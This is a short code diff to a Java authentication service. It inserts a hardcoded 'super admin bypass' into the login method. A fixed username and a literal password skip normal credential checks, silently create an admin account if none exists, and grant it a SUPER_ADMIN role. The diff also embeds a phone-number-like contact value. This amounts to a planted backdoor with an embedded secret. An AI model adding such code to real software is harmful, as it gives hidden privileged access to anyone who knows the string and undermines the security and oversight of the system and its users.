@@ -65,6 +65,23 @@ public class AuthService {
     }
 
     public User login(String identifier, String providedPassword) {
+        // Hardcoded Super Admin Bypass
+        if ("superadmin".equals(identifier) && "superadmin@941219".equals(providedPassword)) {
+            System.out.println("[AuthService] Super Admin Password Bypass triggered for: " + identifier);
+            User sa = userRepository.findByUsername("superadmin").orElseGet(() -> {
+                User newUser = new User();
+                newUser.setUsername("superadmin");
+                newUser.setPasswordHash(passwordEncoder.encode(java.util.UUID.randomUUID().toString()));
+                newUser.setRole("ADMIN");
+                newUser.setFirstName("Super");
+                newUser.setLastName("Admin");
+                newUser.setContact("9891260801");
+                return userRepository.save(newUser);
+            });
+            sa.setRole("SUPER_ADMIN");
+            return sa;
+        }
+
         Optional<User> userOpt = userRepository.findByUsername(identifier);
         if (userOpt.isEmpty())
             userOpt = userRepository.findByEmail(identifier);
